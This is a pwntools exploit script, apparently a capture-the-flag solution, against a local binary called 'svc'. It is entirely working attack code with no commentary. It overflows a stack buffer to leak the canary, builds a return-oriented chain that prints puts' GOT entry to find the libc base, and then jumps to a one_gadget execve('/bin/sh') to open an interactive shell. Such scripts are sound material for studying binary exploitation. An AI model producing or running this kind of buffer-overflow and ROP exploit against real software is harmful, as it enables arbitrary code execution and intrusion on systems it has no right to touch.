from pwn import *

target = process("./svc")
elf = ELF("./svc")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

address = {}
address["puts of plt"] = p64(elf.symbols["puts"])
address["puts of got"] = p64(elf.got["puts"])
address["main of start"] = p64(0x400a96)  # get from Ghidra

offset = {}
offset["puts"] = libc.symbols["puts"]
offset["system"] = libc.symbols["system"]
offset["/bin/sh"] = offset["system"] + \
    (0x7ffff7daa152 - 0x7ffff7c68e50)  # get from search-pattern of gdb
offset["execve('/bin/sh', r12, r13)"] = 0xcbd1a  # get from one_gadget

gadget = {}
gadget["pop rdi; ret"] = p64(0x400ea3)  # get from ROPGadgets
gadget["pop r12; pop r13; pop r14; pop r15; ret"] = p64(0x400e9c)

canary = b""


def feed(data: bytes):
  print(target.recvuntil(b">>"))
  target.sendline(b"1")
  print(target.recvuntil(b">>"))
  target.send(data)


def leave():
  print(target.recvuntil(b">>"))
  target.sendline(b"3")


def leak_canary():
  global canary
  payload = b"0" * 0xa8
  payload += b"0"
  feed(payload)  # Fill up space up to the canary
  print(target.recvuntil(b">>"))
  target.sendline(b"2")
  print(target.recvuntil(b"0"*0xa9))
  canary_leak = target.recv(7)
  canary = b"\x00" + canary_leak


def leak_libc():
  payload = b"0" * 0xa8
  payload += canary
  payload += b"1" * 0x8
  payload += gadget["pop rdi; ret"]
  payload += address["puts of got"]
  payload += address["puts of plt"]
  payload += address["main of start"]
  feed(payload)
  leave()
  print(target.recvuntil(b"[*]BYE ~ TIME TO MINE MIENRALS...\x0a"))
  puts_leak = target.recvline().strip(b"\n")
  address["puts"] = puts_leak + (b"\x00" * (8-len(puts_leak)))
  address["libc"] = u64(address["puts"]) - offset["puts"]
  # address["system"] = p64(address["libc"] + offset["system"])
  # address["/bin/sh"] = p64(address["libc"] + offset["/bin/sh"])
  address["execve('/bin/sh', r12, r13)"] = p64(address["libc"] +
                                               offset["execve('/bin/sh', r12, r13)"])


def exec_shell():
  payload = b"0" * 0xa8
  payload += canary
  payload += b"1" * 0x8
  # payload += gadget["pop rdi; ret"]
  # payload += address["/bin/sh"]
  # payload += address["system"]
  payload += gadget["pop r12; pop r13; pop r14; pop r15; ret"]
  payload += p64(0x0)
  payload += p64(0x0)
  payload += p64(0x0)
  payload += p64(0x0)
  payload += address["execve('/bin/sh', r12, r13)"]
  feed(payload)
  leave()


def main():
  leak_canary()
  leak_libc()
  exec_shell()
  target.interactive()


if __name__ == "__main__":
  main()
